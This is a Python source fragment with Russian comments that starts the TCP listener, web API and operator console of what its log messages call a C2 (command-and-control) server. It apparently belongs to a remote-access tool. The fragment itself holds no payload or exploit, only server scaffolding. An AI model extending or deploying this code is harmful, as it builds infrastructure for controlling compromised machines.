# backend/Core/Server.py (фрагмент изменений)

import asyncio
import multiprocessing
import webbrowser
from logs import Log as logger
from backend import IP, PORT, API_PORT
from backend.API import run_fastapi_server
from .ClientConnection import client_handler
from backend.CLI.CLI import operator_interface, print_c2_ready_message
from backend import start_benchmark

async def start_server():
    from backend.API.api import manager
    log_queue = multiprocessing.Queue()

    # Оставляем ТОЛЬКО TCP Сервер
    server = await asyncio.start_server(
        lambda r, w: client_handler(r, w),
        IP, PORT,
        reuse_address=True,
        backlog=1000,
        # Добавь ограничение на чтение, чтобы не захлебнуться
        limit=1024 * 1024 * 5  # 5MB буфер для тяжелых кадров
    )

    addr = server.sockets[0].getsockname()
    logger.info(f"[+] TCP C2 Server started on {addr}")
    # UDP больше не нужен

    log_task = asyncio.create_task(logger.start_queue_listener(log_queue))
    api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))
    cli_task = asyncio.create_task(operator_interface(server))

    start_benchmark(asyncio.get_running_loop(), interval=1)
    webbrowser.open(f"http://{IP}:{API_PORT}/")
    print_c2_ready_message()

    async with server:
        try:
            await asyncio.gather(
                server.serve_forever(),
                log_task,
                api_task,
                cli_task
            )
        except asyncio.CancelledError:
            logger.info("[*] Server shutdown initiated.")
        finally:
            log_queue.put("STOP")
            api_task.cancel()
            cli_task.cancel()
            await asyncio.gather(log_task, api_task, cli_task, return_exceptions=True)
            logger.info("[*] Server stopped.")